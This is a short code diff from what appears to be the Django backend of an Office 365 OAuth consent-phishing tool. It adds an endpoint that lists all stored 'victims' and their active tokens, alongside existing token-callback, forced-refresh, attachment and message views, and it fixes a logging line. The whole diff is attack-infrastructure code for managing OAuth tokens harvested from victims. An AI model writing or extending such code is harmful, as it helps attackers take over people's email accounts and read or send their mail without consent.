@@ -61,6 +61,16 @@ def token_callback(request):
 
         return redirect(app.conclude_redirect)
 
+class Index(APIView):
+    """
+    List all the tokens that are active for the application
+    """
+    template_name = 'oauth_office365/index.html'
+
+    def get(self, request):
+        victims = Victim.objects.all()
+        serializer = VictimSerializer(victims, many= True)
+        return Response({'victims' : serializer.data})
 
 class ForceTokenRefresh(APIView):
     """
@@ -144,7 +154,7 @@ class AttachmentViewGeneric(generics.CreateAPIView):
         serializer = AttachmentSerializer(data= request.data)
         serializer.is_valid(raise_exception= True)
         headers = self.get_success_headers(serializer.data)
-        logger.info('Uploaded new file attachment %s', data['name'], extra={'user':request.user})
+        logger.info('Uploaded new file attachment %s', serializer.data['name'], extra={'user':request.user})
         return Response(serializer.data, status=status.HTTP_201_CREATED, headers= headers)
 
 class MessageViewGeneric(generics.CreateAPIView):
